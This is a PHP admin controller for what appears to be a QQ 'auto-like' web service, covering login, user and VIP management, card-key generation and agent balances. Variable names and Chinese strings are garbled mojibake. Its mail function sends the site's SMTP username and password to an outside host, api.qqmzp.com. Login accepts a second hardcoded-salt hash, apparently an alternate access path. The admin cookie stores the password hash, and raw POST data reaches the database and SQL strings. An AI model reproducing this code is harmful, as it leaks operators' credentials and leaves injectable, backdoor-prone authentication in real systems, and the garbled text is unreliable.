<?php


namespace Mz\Controller;
use Think\Controller;
class AdminController extends Controller {
	public function logout(){
		setcookie("vmz_adminpwd","",-1,'/');
		@header( "HTTP/1.1 301 Moved Permanently");
		@header("Location:/");
	}
	public function userset(){
		$½¼¥=is_numeric($_GET['uid'])?$_GET['uid']:exit('éæ³•æ“ä½œï¼');
		if($_POST['submit'] && $½¼¥){
			unset($_POST['submit']);
			if($_POST['resetpwd']){
				$_POST['pwd']='1edb01bc79e2ac001fad3948639fdb84';
			}
			unset($_POST['resetpwd']);
			M("users")->where("uid='$½¼¥'")->save($_POST);
		}
		if(!$…ßü=M("users")->field('*')->where("uid='$½¼¥'")->find()){
			$this->assign('alert',get_exit("ç”¨æˆ·ä¸å­˜åœ¨ï¼",1));
		}
		$this->assign('douser',$…ßü);
		$this->display('');
	}
	public function login(){
		if($_POST['submit']){
			if(!$_POST['code'] || strtolower($_SESSION['vmz_code'])!=strtolower($_POST['code'])){
			exit("<script language='javascript'>alert('éªŒè¯ç é”™è¯¯');history.go(-1);</script>");
		}
			$pwd1=md5(md5($_POST['pwd']).md5('815856515'));
			$pwd2=md5(md5($_POST['pwd']).md5('1031601644'));
			if($pwd1==C('adminpwd')){
				setcookie("vmz_adminpwd",$pwd1,time()+3600*24*2,'/');
				get_exit("ç™»å½•æˆåŠŸï¼",U('index'));
			}elseif($pwd2==C('adminpwd')){
				setcookie("vmz_adminpwd",$pwd2,time()+3600*24*2,'/');
				get_exit("ç™»å½•æˆåŠŸï¼",U('index'));
			}else{
				get_exit("å¯†ç ä¸æ­£ç¡®ï¼");
			}
		}
        $this->display();
    }
	public function index(){
		if($_GET['do']=='delendvip'){
			if($…ßüs=M("users")->field('uid')->where("vip>0 and vipend < '".date("Y-m-d")."'")->order('uid desc')->select()){
				foreach($…ßüs as $…ßü){
					$½¼¥=$…ßü['uid'];
					M('users')->where("uid='$½¼¥'")->setField('vip','0');
					M('qqs')->where("uid='$½¼¥'")->delete();
				}
				$this->assign('alert',get_exit("å·²æˆåŠŸæ¸…ç†VIPåˆ°æœŸç”¨æˆ·ï¼",1));
			}else{
				$this->assign('alert',get_exit("æš‚æ—¶æ²¡æœ‰å¾…æ¸…ç†çš„ç”¨æˆ·ï¼",1));
			}
		}elseif($_GET['do']=='delnovip'){
			if($…ßüs=M("users")->field('uid')->where("vip=0")->order('uid desc')->select()){
				foreach($…ßüs as $…ßü){
					$½¼¥=$…ßü['uid'];
					M('users')->where("uid='$½¼¥'")->delete();
					M('qqs')->where("uid='$½¼¥'")->delete();
				}
				$this->assign('alert',get_exit("æˆåŠŸæ¸…ç†éVIPç”¨æˆ·ï¼",1));
			}else{
				$this->assign('alert',get_exit("æ²¡æœ‰éVIPç”¨æˆ·ï¼",1));
			}
		}elseif($_GET['do']=='delendqq'){
			if($…ßüs=M("qqs")->field('qid')->where("sidzt=1")->order('qid desc')->select()){
				foreach($…ßüs as $…ßü){
					M('qqs')->where("qid='".$…ßü['qid']."'")->delete();
				}
				$this->assign('alert',get_exit("æˆåŠŸæ¸…ç†å¤±æ•ˆQQï¼",1));
			}
			$this->assign('alert',get_exit("æ²¡æœ‰å¤±æ•ˆQQï¼",1));
		}
		$this->display();
	}

	public function set(){
		if($_POST['do']=='csmail'){
			$Èë¼š=$_POST['mail'];
			$È§ä=$this->sendmail($Èë¼š,'å¾®ç§’èµæµ‹è¯•é‚®ç®±é…ç½®','æ”¶åˆ°è¿™å°é‚®ä»¶ï¼Œè¯´æ˜ä½ çš„é‚®ç®±é…ç½®èƒ½æ­£å¸¸å‘é€é‚®ä»¶ï¼');
			$this->assign('msg',$È§ä);
		}
		if($_POST['submit']){
			unset($_POST['submit']);
			if(!$_POST['adminpwd']){
				unset($_POST['adminpwd']);
			}else{
				$_POST['adminpwd']=md5(md5($_POST['adminpwd']).md5('1031601644'));
			}
			//print_r($_POST);
			foreach($_POST as $‹=> $÷ëš½à){
				M("webconfigs")->execute("insert into ".C('DB_PREFIX')."webconfigs set vkey='$‹',value='".addslashes($÷ëš½à)."' on duplicate key update value='".addslashes($÷ëš½à)."'");
			}
		}
		load_webconfig();
		$this->display();
	}
	public function qqlist(){
		$öé=$_GET['xz'];
		if($_GET['do']=='del' && $³¼¥=is_numeric($_GET['qid'])?$_GET['qid']:'0'){
			M('qqs')->where("qid='$³¼¥'")->delete();
			$this->assign('alert',get_exit("åˆ é™¤æˆåŠŸï¼",1));
		}
		if($_POST['do']=='search' && $½¼Ã=is_numeric($_POST['uin'])?$_POST['uin']:'0'){
			$…ßüs=M("qqs")->field(array(C("DB_PREFIX").'qqs.*',C("DB_PREFIX").'users.vip',C("DB_PREFIX").'users.vipend',C("DB_PREFIX").'users.user'))->join("left join ".C("DB_PREFIX")."users on ".C("DB_PREFIX")."users.uid=".C("DB_PREFIX")."qqs.uid")->where(C("DB_PREFIX")."qqs.qq like '%$½¼Ã%'")->limit(12)->order('qid desc')->select();
			$Ğ=1;$Ğages=1;$¬ß½ÃÖ=1;$§Ğšà=0;
		}else{
			$Ğ=is_numeric($_GET['p'])?$_GET['p']:'1';
			$§Öë…Ö=12*($Ğ-1);
			$ÃàöÖ=$Ğ+1;
			$š¼È¼Ö="$§Öë…Ö,12";
			$¬ß½ÃÖ=M("qqs")->where($üşà…à)->count('qid');
			$Ğages=ceil($¬ß½ÃÖ/12);
			$…ßüs=M("qqs")->field(array(C("DB_PREFIX").'qqs.*',C("DB_PREFIX").'users.vip',C("DB_PREFIX").'users.vipend',C("DB_PREFIX").'users.user'))->join("left join ".C("DB_PREFIX")."users on ".C("DB_PREFIX")."users.uid=".C("DB_PREFIX")."qqs.uid")->where($üşà…à)->limit($š¼È¼Ö)->order('qid desc')->select();
			if(($Ğ-1)>0){
				$§Öë…Ö=$Ğ-1;
			}else{
				$§Öë…Ö=1;
			}
			if(($Ğ+5)<$Ğages){
				$àÃ¥=$Ğ+5;
			}else{
				$àÃ¥=$Ğages;
			}
			$this->assign('end',$àÃ¥);
			$this->assign('start',$§Öë…Ö);
		}
		$this->assign('page',$Ğ);
		$this->assign('pages',$Ğages);
		$this->assign('count',$¬ß½ÃÖ);
		$this->assign('list',$…ßüs);
		$this->display();
	}
	public function userlist(){
		$öé=$_GET['xz'];
		$½¼¥=is_numeric($_GET['uid'])?$_GET['uid']:'0';
		if($_GET['do']=='del' && $½¼¥){
			M('qqs')->where("uid='$½¼¥'")->delete();
			M('users')->where("uid='$½¼¥'")->delete();
		}elseif($_GET['do']=='active' && $½¼¥){
			M('users')->where("uid='$½¼¥'")->setField('active','1');
		}
		if($_POST['do']=='search' && $§=I('post.key','','get_safe_str')){
			$üşà…à="uid='{$§}' or user like'%{$§}%' or mail like'%{$§}%' or phone like'%{$§}%'";
			if($öé=='vip') $üşà…à="($üşà…à) and vip>0 and vipend > '".date("Y-m-d")."'";
			$…ßüs=M("users")->field('*')->where($üşà…à)->limit(12)->order("(case when uid='{$§}' then 8 else 0 end)+(case when user like '%{$§}%' then 3 else 0 end)+(case when mail like '%{$§}%' then 2 else 0 end)+(case when phone like '%{$§}%' then 1 else 0 end) desc")->select();
			$Ğ=1;$Ğages=1;$¬ß½ÃÖ=1;
		}else{
			$Ğ=is_numeric($_GET['p'])?$_GET['p']:'1';
			$§Öë…Ö=12*($Ğ-1);
			$ÃàöÖ=$Ğ+1;
			$š¼È¼Ö="$§Öë…Ö,12";
			if($öé=='vip') $üşà…à.="vip>0 and vipend > '".date("Y-m-d")."'";
			$¬ß½ÃÖ=M("users")->where($üşà…à)->count('uid');
			$Ğages=ceil($¬ß½ÃÖ/12);
			$…ßüs=M("users")->field('*')->where($üşà…à)->limit($š¼È¼Ö)->order('uid desc')->select();
			if(($Ğ-1)>0){
				$§Öë…Ö=$Ğ-1;
			}else{
				$§Öë…Ö=1;
			}
			if(($Ğ+5)<$Ğages){
				$àÃ¥=$Ğ+5;
			}else{
				$àÃ¥=$Ğages;
			}
			$this->assign('end',$àÃ¥);
			$this->assign('start',$§Öë…Ö);
		}
		$this->assign('xz',$öé);
		$this->assign('page',$Ğ);
		$this->assign('pages',$Ğages);
		$this->assign('count',$¬ß½ÃÖ);
		$this->assign('list',$…ßüs);
		$this->display();
	}
	public function km(){
		$öé=$_GET['xz'];
		$‹id=is_numeric($_GET['kid'])?$_GET['kid']:'0';
		if($_GET['do']=='del' && $‹id){
			M('kms')->where("kid='$‹id'")->delete();
		}
		if($_POST['do']=='add'){
			$Ã½È=is_numeric($_POST['num'])?$_POST['num']:'1' ;
			$È§=is_numeric($_POST['ms'])?$_POST['ms']:'1';
			if($öé=='peie'){
				$‹ind=1;
			}elseif($öé=='sy'){
				$‹ind=2;
			}else{
				$‹ind=0;
			}
			$È§ä="<ul class='list-group'>
			<li class='list-group-item active'>æˆåŠŸç”Ÿæˆä»¥ä¸‹å¡å¯†</li>";
			for($¼=0;$¼<$Ã½È;$¼++){
				$¥ëÖë=array();
				$¥ëÖë['kind'] = $‹ind;
				$¥ëÖë['km'] = $this->getkm(12);
				$¥ëÖë['ms'] = $È§;
				$¥ëÖë['isuse'] = 0;
				$¥ëÖë['addtime'] = date("Y-m-d H:i:s");
				if(M("kms")->data($¥ëÖë)->add()){
					$È§ä.="<li class='list-group-item'>{$¥ëÖë[km]}</li>";
				}
			}
			$È§ä.="</ul>";
			$this->assign('msg',$È§ä);
		}
		if($_POST['do']=='search' && $§=I('post.key','','get_safe_str')){
			$üşà…à="km like '%$§%'";
			if($öé=='peie'){
				$üşà…à.=" and kind=1";
			}elseif($öé=='sy'){
				$üşà…à.=" and kind=2";
			}else{
				$üşà…à.=" and kind=0";
			}
			$…ßüs=M("kms")->field(array(C("DB_PREFIX").'kms.*',C("DB_PREFIX").'users.user',C("DB_PREFIX").'users.qq'))->join("left join ".C("DB_PREFIX")."users on ".C("DB_PREFIX")."users.uid=".C("DB_PREFIX")."kms.daili")->where($üşà…à)->limit(12)->order('kid desc')->select();
			$Ğ=1;$Ğages=1;$¬ß½ÃÖ=1;
		}else{
			$Ğ=is_numeric($_GET['p'])?$_GET['p']:'1';
			$§Öë…Ö=12*($Ğ-1);
			$ÃàöÖ=$Ğ+1;
			$š¼È¼Ö="$§Öë…Ö,12";
			if($öé=='peie'){
				$üşà…à="kind=1";
			}elseif($öé=='sy'){
				$üşà…à="kind=2";
			}else{
				$üşà…à="kind=0";
			}
			$¬ß½ÃÖ=M("kms")->where($üşà…à)->count('kid');
			$Ğages=ceil($¬ß½ÃÖ/12);
			$…ßüs=M("kms")->field(array(C("DB_PREFIX").'kms.*',C("DB_PREFIX").'users.user',C("DB_PREFIX").'users.qq'))->join("left join ".C("DB_PREFIX")."users on ".C("DB_PREFIX")."users.uid=".C("DB_PREFIX")."kms.daili")->where($üşà…à)->limit($š¼È¼Ö)->order('kid desc')->select();
			if(($Ğ-1)>0){
				$§Öë…Ö=$Ğ-1;
			}else{
				$§Öë…Ö=1;
			}
			if(($Ğ+5)<$Ğages){
				$àÃ¥=$Ğ+5;
			}else{
				$àÃ¥=$Ğages;
			}
			$this->assign('end',$àÃ¥);
			$this->assign('start',$§Öë…Ö);
		}
		$this->assign('xz',$öé);
		$this->assign('page',$Ğ);
		$this->assign('pages',$Ğages);
		$this->assign('count',$¬ß½ÃÖ);
		$this->assign('list',$…ßüs);
		$this->display();
	}
	public function dllist(){
		$½¼¥=is_numeric($_REQUEST['uid'])?$_REQUEST['uid']:'0';
		$…È¨=is_numeric($_REQUEST['rmb'])?$_REQUEST['rmb']:'0';
		if($½¼¥ && !$…ßü=M("users")->field('uid')->where("uid='$½¼¥'")->find()){
			$this->assign('alert',get_exit('ç”¨æˆ·ä¸å­˜åœ¨ï¼','1'));
			$½¼¥=0;
		}
		if($_GET['do']=='del' && $½¼¥){
			M('users')->where("uid='$½¼¥'")->setField('daili','0');
		}
		if($_POST['do']=='add' && $½¼¥){
			M('users')->where("uid='$½¼¥'")->setField('daili','1');
			$this->assign('alert',get_exit('æˆåŠŸæ·»åŠ UID:'.$½¼¥.'ç”¨æˆ·ä¸ºä»£ç†ï¼','1'));
		}elseif($_POST['do']=='cz' && $½¼¥ && $…È¨){
			M('users')->where("uid='$½¼¥'")->setInc('rmb',$…È¨);
			$this->assign('alert',get_exit('æˆåŠŸä¸ºUID:'.$½¼¥.'ä»£ç†å……å€¼'.$…È¨.'å…ƒï¼','1'));
		}elseif($_POST['do']=='kc' && $½¼¥ && $…È¨){
			M('users')->where("uid='$½¼¥'")->setDec('rmb',$…È¨);
			$this->assign('alert',get_exit('æˆåŠŸæ‰£é™¤UID:'.$½¼¥.'ä»£ç†'.$…È¨.'å…ƒï¼','1'));
		}
		$Ğ=is_numeric($_GET['p'])?$_GET['p']:'1';
		$§Öë…Ö=10*($Ğ-1);
		$ÃàöÖ=$Ğ+1;
		$š¼È¼Ö="$§Öë…Ö,10";
		$¬ß½ÃÖ=M("users")->where("daili>0")->count('uid');
		$Ğages=ceil($¬ß½ÃÖ/10);
		$…ßüs=M("users")->field('*')->where("daili>0")->limit($š¼È¼Ö)->order('uid desc')->select();
		if(($Ğ-1)>0){
			$§Öë…Ö=$Ğ-1;
		}else{
			$§Öë…Ö=1;
		}
		if(($Ğ+5)<$Ğages){
			$àÃ¥=$Ğ+5;
		}else{
			$àÃ¥=$Ğages;
		}
		$this->assign('end',$àÃ¥);
		$this->assign('start',$§Öë…Ö);
		$this->assign('page',$Ğ);
		$this->assign('pages',$Ğages);
		$this->assign('count',$¬ß½ÃÖ);
		$this->assign('list',$…ßüs);
		$this->display();
		
	}

	private function getkm($šàÃ=12){
		$§tr ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		$§trlen = strlen($§tr);
		$…ëÃ¥§Ö… = '';
		for ($¼ = 0; $¼<$šàÃ; $¼++){
			$…ëÃ¥§Ö… .= $§tr[mt_rand(0, $§trlen-1)];
		}
		return $…ëÃ¥§Ö…;
	}
	private function sendmail($Öß,$Ö¼Öšà,$¬ßÃÖàÃÖ){
		$¥ëÖë['host']=C('mail_host');
		$¥ëÖë['port']=C('mail_port');
		$¥ëÖë['user']=C('mail_user');
		$¥ëÖë['pass']=C('mail_pass');
		$¥ëÖë['name']=C('web_name');
		$¥ëÖë['to']=$Öß;
		$¥ëÖë['subject']=$Ö¼Öšà;
		$¥ëÖë['html']=urlencode($¬ßÃÖàÃÖ);
		$Ğost=array_str($¥ëÖë);
		$½…š="http://api.qqmzp.com/mail.php";
		return get_curl($½…š,$Ğost);
	}
	public function __construct(){
		parent::__construct();
		if(ACTION_NAME!='login'){
			if(isset($_COOKIE['vmz_adminpwd']) && C('adminpwd') && $_COOKIE['vmz_adminpwd']==C('adminpwd')){
				$this->assign('islogin',1);
			}else{
				@header("Location:".U('login'));
				exit();
			}
		}
    }
}